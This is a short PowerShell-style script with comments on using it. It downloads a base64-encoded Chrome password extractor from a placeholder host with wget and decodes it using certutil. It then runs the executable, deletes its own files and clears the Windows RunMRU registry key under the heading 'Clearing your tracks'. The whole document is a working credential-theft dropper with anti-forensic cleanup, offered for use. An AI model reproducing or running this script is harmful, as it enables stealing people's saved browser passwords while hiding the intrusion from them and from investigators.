// 1)--> First create your own Chrome_password_extractor.exe using https://github.com/yogendrasinghx/Chrome_Password_Extractor
// 2)--> Encode the Chrome_password_extractor.exe with base64 using https://www.base64encode.org
// 3)--> Replace  http://0.0.0.0/chrome/cpe.txt with Encoded_Chrome_password_extractor.txt download link

wget  http://0.0.0.0/chrome/cpe.txt -OutFile cpe.txt

certutil -decode cpe.txt cpe.exe 

//Start-Sleep -s 5

start cpe.exe

 // --> Clearing your tracks

rm cpe.PS1 -Force 
rm cpe.txt -Force 
//rm cpe.exe -Force 
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

exit
